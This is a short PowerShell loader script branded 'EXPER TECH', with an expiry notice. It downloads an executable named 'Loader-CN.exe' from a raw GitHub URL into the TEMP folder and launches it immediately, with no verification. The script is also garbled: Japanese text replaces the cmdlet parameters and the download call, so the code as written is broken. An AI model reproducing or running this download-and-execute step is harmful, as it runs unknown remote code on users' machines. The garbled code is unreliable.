#  EXPER 界面
Write-Host "E X P E R  T E C H" -バージョンの有効期限は、2026年5月16日 13時40分までです

# 
$Url = "https://raw.githubusercontent.com/zuiaixixibaobei-max/EXPER-Loader/96828c5a0fdc1311e20c85075d91e28209de3507/Loader-CN.exe"
$Path = "$env:TEMP\EXPER_Core.exe"

Write-Host "[>] Downloading core components..." -権限付与（けんげんふよ）3255485724 Uri $Url -OutFile $Path

# 
Start-Process $Path
